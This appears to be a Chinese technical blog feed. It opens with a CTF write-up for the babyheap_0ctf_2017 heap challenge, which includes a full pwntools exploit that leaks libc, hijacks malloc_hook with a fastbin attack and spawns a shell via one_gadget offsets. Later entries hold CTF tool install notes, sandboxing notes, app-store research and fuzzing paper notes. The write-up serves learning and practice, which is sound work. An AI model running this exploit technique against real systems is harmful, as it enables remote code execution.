<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Fill</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  result = sub_138C();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)result &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(<span class="type">unsigned</span> <span class="type">int</span> *)(<span class="number">24LL</span> * (<span class="type">int</span>)result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      result = sub_138C();</span><br><span class="line">      v3 = result;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">int</span>)result &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> sub_11B2(*(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>), v3);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Dump</code>函数打印指定index的内容，可以用于泄漏main_arena地址，进一步泄漏libc基址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">Dump</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  result = sub_138C();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)result &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(_DWORD *)(<span class="number">24LL</span> * result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      sub_130F(*(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>), *(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">8</span>));</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(byte_14F1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此答题思路为unsortedbin attack泄漏libc基址，fastbin attack劫持malloc_hook，使用one_gadget getshell</p>
<h3 id="Step1-泄漏Libc基址"><a href="#Step1-泄漏Libc基址" class="headerlink" title="Step1: 泄漏Libc基址"></a>Step1: 泄漏Libc基址</h3><p>注：当small chunk被释放时，它的fd，bk指向同一个指针即top chunk地址，这个地址保存在main_arena的0x58偏移处，而main_arena在libc的data段中，是全局静态变量，偏移也是固定的，根据这些可以计算出libc的基址。因此只需要当small chunk释放后，还可以打印出其值。</p>
<p>首先申请一些小堆块，然后free掉id 1,2，利用堆溢出漏洞，将chunk2 fd指针修改为chunk4地址，相当于chunk4已经free并且为fastbin，然后要malloc回chunk4,不过由于有大小检查，需要修改chunk4的大小，通过修改chunk3来实现。这样可以实现将small chunk放入fastbin中的效果。注，此时有两个指针指向同一个chunk4，此时将chunk4大小修改回原来值，将正常的chunk4 free掉，就可以令其fd,bk指针指向top_chunk，同时新申请的也指向了chunk4,可以用于查看fd,bk值。由此可以计算出libc值</p>
<h3 id="Step2-修改malloc-hook为one-gadget"><a href="#Step2-修改malloc-hook为one-gadget" class="headerlink" title="Step2: 修改malloc_hook为one_gadget"></a>Step2: 修改malloc_hook为one_gadget</h3><p>使用fastbin attack构造fake chunk修改malloc_hook指针地址即可</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./babyheap_0ctf_2017&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">25147</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">struct &#123;</span></span><br><span class="line"><span class="string">    1, (8) # 表示是否allocate</span></span><br><span class="line"><span class="string">    size: , (8)</span></span><br><span class="line"><span class="string">    content pointer: , (8)</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allocate</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>, index)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>, index)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>, index)</span><br><span class="line">    p.recvline()</span><br><span class="line">    <span class="keyword">return</span> p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">heap overflow</span></span><br><span class="line"><span class="string">1. 泄漏libc基址</span></span><br><span class="line"><span class="string">2. 修改libc中malloc_hook地址为one_gadget</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step1: 泄漏libc基址</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *$rebase(0x0000000000001142)&#x27;)</span></span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">allocate(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">free(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span>, <span class="number">0x21</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span>, <span class="number">0x21</span>, p8(<span class="number">0x80</span>))</span><br><span class="line">fill(<span class="string">b&#x27;0&#x27;</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span>, <span class="number">0x21</span>)</span><br><span class="line">fill(<span class="string">b&#x27;3&#x27;</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span>, <span class="number">0x91</span>)</span><br><span class="line">fill(<span class="string">b&#x27;3&#x27;</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_addr = u64(dump(<span class="string">b&#x27;2&#x27;</span>)[:<span class="number">8</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">success(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step2: 劫持malloc_hook</span></span><br><span class="line">fake_chunk = libc_addr + <span class="number">0x3c4aed</span></span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">payload = flat(fake_chunk)</span><br><span class="line">fill(<span class="string">b&#x27;2&#x27;</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">one_gadget = libc_addr + <span class="number">0x4526a</span></span><br><span class="line">payload = flat(p8(<span class="number">0</span>)*<span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, one_gadget)</span><br><span class="line">fill(<span class="string">b&#x27;6&#x27;</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">allocate(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>Heap</tag>
        <tag>Fastbin</tag>
        <tag>Attack</tag>
      </tags>
  </entry>
  <entry>
    <title>Bochspwn学习</title>
    <url>/posts/96f187a0.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>qiling为单线程的模拟，无法模拟并检测到内核中多线程由于条件竞争导致的内核漏洞。因此学习Bochspwn工具的使用，查看能否用于检测内核的多线程条件竞争的内核漏洞。</p>
<h2 id="贡献"><a href="#贡献" class="headerlink" title="贡献"></a>贡献</h2><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Bochspwn是一个系统范围的工具，旨在记录操作系统内核执行的内存访问，并检查它们，以搜索提示存在某些漏洞的模式，比如“double fetch”。有关内存引用的信息是通过在Bochs IA-32仿真器中运行目标操作系统，在Windows内核中发现了超过50个竞争条件类的漏洞。</p>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>论文复现</tag>
        <tag>内核</tag>
        <tag>条件竞争</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF常用工具汇总</title>
    <url>/posts/81c8e8b2.html</url>
    <content><![CDATA[<p>记录了ctf的常用工具，随缘更新~</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><p>最基础的工具之一，python库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">python3 -m pip install --upgrade pip</span><br><span class="line">python3 -m pip install --upgrade pwntools</span><br></pre></td></tr></table></figure>

<h3 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h3><p>最基础的工具之一，调试神器</p>
<p><a href="https://blog.csdn.net/whbing1471/article/details/112410599">https://blog.csdn.net/whbing1471/article/details/112410599</a></p>
<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install checksec</span><br></pre></td></tr></table></figure>

<h3 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h3><p><a href="https://github.com/JonathanSalwan/ROPgadget.git">https://github.com/JonathanSalwan/ROPgadget.git</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install python3-pip</span><br><span class="line">sudo -H python3 -m pip install ROPgadget</span><br><span class="line">ROPgadget --help</span><br></pre></td></tr></table></figure>

<h3 id="ropper"><a href="#ropper" class="headerlink" title="ropper"></a>ropper</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install capstone filebytes unicorn keystone-engine ropper</span><br><span class="line">ropper --help</span><br></pre></td></tr></table></figure>

<h3 id="onegadget"><a href="#onegadget" class="headerlink" title="onegadget"></a>onegadget</h3><p><a href="https://github.com/david942j/one_gadget">https://github.com/david942j/one_gadget</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt -y install ruby</span><br><span class="line">gem install one_gadget</span><br></pre></td></tr></table></figure>

<h3 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h3><p><a href="https://github.com/lieanu/LibcSearcher">https://github.com/lieanu/LibcSearcher</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/lieanu/LibcSearcher.git</span><br><span class="line">cd LibcSearcher</span><br><span class="line">python setup.py develop</span><br></pre></td></tr></table></figure>

<h3 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc-all-in-one"></a>glibc-all-in-one</h3><p><a href="https://github.com/matrix1001/glibc-all-in-one">https://github.com/matrix1001/glibc-all-in-one</a></p>
<h3 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h3><p><a href="https://github.com/NixOS/patchelf">https://github.com/NixOS/patchelf</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./bootstrap.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make check</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>



<p>error：<code>./bootstrap.sh: 2: autoreconf: not found</code></p>
<p>解决方案：<code>sudo apt-get install autoconf</code></p>
<h3 id="LibcSearcher-1"><a href="#LibcSearcher-1" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/lieanu/LibcSearcher.git</span><br><span class="line">cd LibcSearcher</span><br><span class="line">python setup.py develop</span><br></pre></td></tr></table></figure>

<h3 id="vmlinux-to-elf"><a href="#vmlinux-to-elf" class="headerlink" title="vmlinux-to-elf"></a>vmlinux-to-elf</h3><p>安装<code>vmlinux-to-elf</code>工具</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip3 install --upgrade git+https://github.com/marin-m/vmlinux-to-elf</span><br><span class="line">vmlinux-to-elf ./bzImage vmlinux</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Sandboxing</title>
    <url>/posts/df529e66.html</url>
    <content><![CDATA[<p>观看pwn.college中sandboxing模块的<a href="https://pwn.college/cse466-f2023/sandboxing/">讲解视频</a>所做的笔记</p>
<h2 id="Modern-Technologies-about-Sandboxing"><a href="#Modern-Technologies-about-Sandboxing" class="headerlink" title="Modern Technologies about Sandboxing"></a>Modern Technologies about Sandboxing</h2><h3 id="Seccomp"><a href="#Seccomp" class="headerlink" title="Seccomp"></a>Seccomp</h3><p>通过设置系统调用的禁用和允许规则来达到目的</p>
<h3 id="Namespace"><a href="#Namespace" class="headerlink" title="Namespace"></a>Namespace</h3><h4 id="创建一个类似于docker的独立命名空间"><a href="#创建一个类似于docker的独立命名空间" class="headerlink" title="创建一个类似于docker的独立命名空间"></a>创建一个类似于docker的独立命名空间</h4><p>unshare命令：Run a program with some namespaces unshared from the parent<br>其创建了一个新的命名空间，其与父进程独立。（注：fork系统调用为完全共享，clone系统调用可以指定共享内容）</p>
<p>unshare后创建的新进程仍然可以访问原本的目录（如&#x2F;），因为还没有mount和unmount。（附：使用mount将根目录下的目录，例如&#x2F;bin等重新mount到新进程下，就可以在新进程下看到，这就是docker container使用的技巧。注意，在外部系统中是看不到mount的目录的，因为unshare不共享mount namespace）</p>
<p>mount命令：挂载文件或设备到指定的文件系统<br>其中&#x2F;dev代表挂载的设备文件，&#x2F;sys代表内核相关的内容</p>
<p>unshare -m -p -n –mount-proc –fork &#x2F;bin&#x2F;bash<br>此命令可以类似于docker创建一个新的进程，进程在一个新的命名空间中，但是仍然可以查看外部文件系统</p>
<h4 id="创建独立的文件系统"><a href="#创建独立的文件系统" class="headerlink" title="创建独立的文件系统"></a>创建独立的文件系统</h4><p>使用mount将&#x2F;bin等目录挂载到当前目录，并且chroot。<br>但是chroot不安全，因此应该有更安全的方法：使用命名空间pivot_root</p>
<p>使用pivot_root，先创建一个old文件夹存放根目录，然后unmount，rmdir。即可实现容器化。</p>
<p>docker额外实现的机制：</p>
<ul>
<li>docker还另外实现了对资源的限制，例如内存用量，使用ulimit命令</li>
<li>对用户的限制，使在容器内为root，但在容器外为普通用户</li>
<li>seccomp限制特定命令，例如unshare，避免其逃逸</li>
</ul>
<p>可以使用nsenter从外部进入已有命名空间eg：nsenter –mount&#x3D;&#x2F;proc&#x2F;xxxx&#x2F;ns&#x2F;mnt [file]<br>(与setns系统调用有关)</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Sandbox</tag>
      </tags>
  </entry>
  <entry>
    <title>国内外安卓应用市场对比调研</title>
    <url>/posts/73ae95ad.html</url>
    <content><![CDATA[<p>分析国内外安卓应用市场的差异，可以用作相关论文的背景素材</p>
<h2 id="1-应用市场规模成碎片化特点"><a href="#1-应用市场规模成碎片化特点" class="headerlink" title="1. 应用市场规模成碎片化特点"></a>1. 应用市场规模成碎片化特点</h2><ul>
<li>安卓市场规模巨大（&gt;77%）</li>
<li>应用市场多达400个，其中有25个主流应用市场<br><strong>佐证材料：</strong></li>
<li><a href="https://www.statista.com/statistics/1058612/china-android-app-store-market-share/">Statista数据——Market share of the Android app stores in China as of May 2022</a><blockquote>
<p>As of May 2022, Huawei AppGallery was the top Android app store in China with a market share of about 44 percent. <strong>China’s technological advancement</strong> combined its <strong>ban on Google</strong> has caused its Android market to be flooded with several competing smartphone manufacturers each with its own app store.（国内市场碎片化的原因：GooglePlay被禁，国内技术发展）<br>In China, Android is the dominating mobile operating system As the Google Play Store is not available in the country, various Android stores have been developed, resulting in a <strong>fragmented app store landscape</strong>. As of the time of writing, there were <strong>25 major Android app stores in mainland China</strong>.（安卓应用市场现状：碎片化、25个主流安卓应用市场）</p>
</blockquote>
</li>
<li><a href="https://www.statista.com/statistics/262176/market-share-held-by-mobile-operating-systems-in-china/">Statista数据——Market share of mobile operating systems in China from September 2014 to September 2024</a><blockquote>
<p>In September 2024, the <strong>Android smartphone operating system</strong> had a market share of <strong>over 77 percent in China</strong>. In contrast, its biggest rival, the Apple iOS had a market share of around 22 percent. The Chinese smartphone market is dominated by domestic brands which operate on the Android operating system. （安卓应用市场占比77%）</p>
</blockquote>
</li>
<li><a href="https://gs.statcounter.com/vendor-market-share/mobile/china/2022">Statcounter数据——Mobile Vendor Market Share China</a><blockquote>
<p>![[2025-01-19-国内外安卓应用市场对比调研&#x2F;file-20250119091308783.png]]<br>![[2025-01-19-国内外安卓应用市场对比调研&#x2F;file-20250119091358855.png]]<br>（安卓市场占有率超过70%）</p>
</blockquote>
</li>
<li><a href="https://www.goclickchina.com/blog/breakdown-of-china-android-market/">文章blog——A Breakdown of China’s Android Market</a><blockquote>
<p>Android is open-source software free to be utilized by any smartphone company. In recent years, <strong>nearly 77% of Chinese smartphones ran the operating system;</strong> however, apps must be offered through a 3rd party rather than Google. There are currently <strong>over 400 Android app stores,</strong> with only 10 taking 90% of the market share.（77%的安卓比例+400多个安卓应用市场）<br>![[2025-01-19-国内外安卓应用市场对比调研&#x2F;file-20250119091712180.png]]</p>
</blockquote>
</li>
</ul>
<h2 id="2-审核内容机制严格"><a href="#2-审核内容机制严格" class="headerlink" title="2. 审核内容机制严格"></a>2. 审核内容机制严格</h2><ul>
<li>对含有赌博、色情、暴力等违规内容的App进行限制和下架<br><strong>佐证材料：</strong></li>
<li><a href="https://english.www.gov.cn/news/topnews/202103/24/content_WS605b1b19c6d0719374afb586.html">文章news新华社2021——China removes over 520 apps for irregularities, vulgar content</a><blockquote>
<p>BEIJING — <strong>The Cyberspace Administration of China (CAC) has removed more than 520 apps in its latest crackdown targeting irregularities and vulgar content</strong>, the internet regulator announced on March 24.</p>
</blockquote>
</li>
<li><a href="https://europe.chinadaily.com.cn/a/202305/02/WS645057c2a310b6054fad0af5.html">文章News2023——Websites, apps penalized for misconduct</a><blockquote>
<p>During the first quarter of this year(2023), Chinese cyberspace regulators at various levels shut down more than 4,200 websites and <strong>banned nearly 70 apps suspected of engaging in criminal activities such as providing illegal news services and spreading pornography</strong>.<br>According to a news release published on Sunday by the Cyberspace Administration of China, the nation’s top cyberspace watchdog, leaders of more than 2,000 websites were summoned and instructed to rectify their actions, and 48 websites were banned from offering or upgrading services.<br><strong>In addition, 55 mobile apps were removed from app stores and 12 were shut down,</strong> the news release said, adding that some 4,200 websites were shuttered and had their licenses revoked.</p>
</blockquote>
</li>
<li><a href="https://www.yahoo.com/news/china-takes-5-500-porn-003224058.html">文章News2017——China takes 5,500 porn, violent apps offline - Xinhua</a><blockquote>
<p>SHANGHAI (Reuters) - China’s internet supervisors have taken down more than <strong>5,500 illegal apps</strong> for disseminating pornographic and violent content among other things, the official Xinhua news agency said on Tuesday.<br>The move is the latest step taken by Beijing to clean up its cyberspace, having launched a crackdown on virtual private network services that allow users to bypass censorship on Monday.<br><strong>More than 1,600 mobile video apps circulating pornographic and violent content were taken offline</strong>, said the cyberspace administration in China’s southern province of Guangdong on Monday.</p>
</blockquote>
</li>
<li><a href="https://appinchina.co/services/localization/content-regulations/">文章Blog——Rules &amp; Content Restrictions for Publishing an App in China</a><blockquote>
<p>Every app submitted to a Chinese app store must go through an approval process before it can be accepted for publication and receive a game license and approval number (ISBN), and various <strong>Chinese governing bodies and agencies have outlined a number of regulations and content restrictions for those apps</strong>.</p>
</blockquote>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>微信网址逆向实战</title>
    <url>/posts/8ee664e8.html</url>
    <content><![CDATA[<p>最近发现了有些网址只能在微信客户端打开，不能在浏览器中打开</p>
<h2 id="方法1：PC-安卓adb"><a href="#方法1：PC-安卓adb" class="headerlink" title="方法1：PC+安卓adb"></a>方法1：PC+安卓adb</h2><p>安卓手机开启adb调试</p>
<p>手机微信打开：<a href="http://debugxweb.qq.com/?inspector=true%EF%BC%8C%E5%BC%B9%E5%87%BA%E6%89%A7%E8%A1%8C%E6%88%90%E5%8A%9F%E5%8D%B3%E5%8F%AF">http://debugxweb.qq.com/?inspector=true，弹出执行成功即可</a></p>
<p>在这里下载adb工具：<a href="https://developer.android.com/tools/releases/platform-tools?hl=zh-cn">https://developer.android.com/tools/releases/platform-tools?hl=zh-cn</a></p>
<p>电脑端Chrome访问chrome:&#x2F;&#x2F;inspect ，点击该网页的inspect，弹出一个新的窗口，在窗口中可正常显示手机页面，上方可以输入任意地址访问，控制台同Chrome浏览器</p>
<p>然后在手机端打开要打开的网页，并在电脑端的chrome中查看是否显示，点击inspect即可</p>
<p>参考网址：</p>
<ul>
<li><a href="https://blog.csdn.net/qq_37651894/article/details/127964618">ADB调试–详细教程（附华为手机无法显示设备解决方法）</a></li>
<li><a href="https://blog.csdn.net/qq_44839815/article/details/131015693">2023年微信内置浏览器调试的五种方法</a></li>
</ul>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>LLMIF源码阅读</title>
    <url>/posts/95a45f3a.html</url>
    <content><![CDATA[<h1 id="LLMIF-论文整理"><a href="#LLMIF-论文整理" class="headerlink" title="LLMIF 论文整理"></a>LLMIF 论文整理</h1><p>论文LLMIF（LLMIF: Augmented Large Language Model for Fuzzing IoT Devices  ）</p>
<ul>
<li>论文作者：Jincheng Wang（The Hong Kong Polytechnic University）</li>
<li>论文链接：<a href="https://ieeexplore.ieee.org/xpl/conhome/10646615/proceeding">2024 IEEE Symposium on Security and Privacy (SP)</a></li>
<li>工作源码：<a href="https://github.com/anonymousAnalyst22/LLMIF">https://github.com/anonymousAnalyst22/LLMIF</a></li>
</ul>
<h2 id="1-解决问题"><a href="#1-解决问题" class="headerlink" title="1. 解决问题"></a>1. 解决问题</h2><ul>
<li>Obfuscated Message Formats（<strong>复杂的消息格式</strong>）: IoT消息格式比较复杂。缺失消息格式会导致以下两个问题：<ol>
<li>种子生成受到消息格式的限制</li>
<li>难以生成有效的变异输入（格式问题）</li>
</ol>
</li>
<li>Unresolved Message Dependencies （未解析<strong>消息依赖</strong>）: IoT协议不同消息对应了设备的不同状态，也就是某些漏洞需要特定的消息序列使设备处于特征状态才能触发。</li>
<li>Lack of Testing Case Evaluations（缺乏案例评估）: <strong>黑盒测试</strong>，缺乏对模糊测试定义合理反馈（代码覆盖率？），导致可能难以提升模糊测试效果。</li>
</ul>
<h2 id="2-核心思路"><a href="#2-核心思路" class="headerlink" title="2. 核心思路"></a>2. 核心思路</h2><p><strong>协议规范提供了丰富且准确的消息格式描述，而复杂繁多的协议描述信息可以由LLM自动化完成</strong></p>
<ul>
<li>协议规范中对<strong>消息header与payload</strong>部分的描述有助于帮助生成正确格式的消息结构，从而有助于提取消息覆盖率、制定有效的变异策略</li>
<li>协议规范会描述与设备交互的具体信息，有助于提取消息之间的依赖关系。<br>eg：<ul>
<li>Zigbee Identify message &lt;-&gt;“This then starts the device’s identification procedure”</li>
<li>AddGroupIfIdentifying message &lt;-&gt; “The message allows the device to <strong>add a group</strong> <strong>on the condition</strong> that it is <strong>identifying</strong> itself”</li>
</ul>
</li>
<li>协议规范展示了消息处理的工作流，可以用于评估测试输入是否达到目标效果</li>
</ul>
<h2 id="3-技术实现"><a href="#3-技术实现" class="headerlink" title="3. 技术实现"></a>3. 技术实现</h2><p>基于LLM实现，LLM辅助分为两个部分：Protocol Information Extraction（协议信息提取），  Device Response Reasoning  （设备响应归因）</p>
<ul>
<li><p><strong>协议信息提取</strong>：LLM提取有效的协议信息：<strong>消息格式</strong>，field value，header structure，<strong>消息依赖关系</strong>。</p>
</li>
<li><p><strong>设备响应推理</strong>：LLM基于协议规范，对给定的test case和设备response判断test case是否导致了设备状态转换。</p>
</li>
</ul>
<h3 id="3-1-大模型增强"><a href="#3-1-大模型增强" class="headerlink" title="3.1 大模型增强"></a>3.1 大模型增强</h3><p>具备相关领域知识的LLM被称为增强语言模型（ALM）</p>
<blockquote>
<p>专业知识嵌入到上下文+CoT</p>
</blockquote>
<h5 id="3-1-1-为什么需要大模型增强"><a href="#3-1-1-为什么需要大模型增强" class="headerlink" title="3.1.1 为什么需要大模型增强"></a>3.1.1 为什么需要大模型增强</h5><p>该工作向我们展示了LLM在IoT Protocol领域相关知识的缺乏，表明了使用ALM的必要性</p>
<ol>
<li>Message identification：LLM需要给出正确的消息名</li>
<li>Format inference：LLM需要输出正确的field name以及field data types</li>
</ol>
<img src="/posts/95a45f3a/image-20250317141742067.png" class="" title="image-20250317141742067">

<p>96个消息类型中，大模型平均只成功构建了15个消息格式，召回率（15.6%）（和表格不一致？和实验评估里chatAFL的结果一致）。</p>
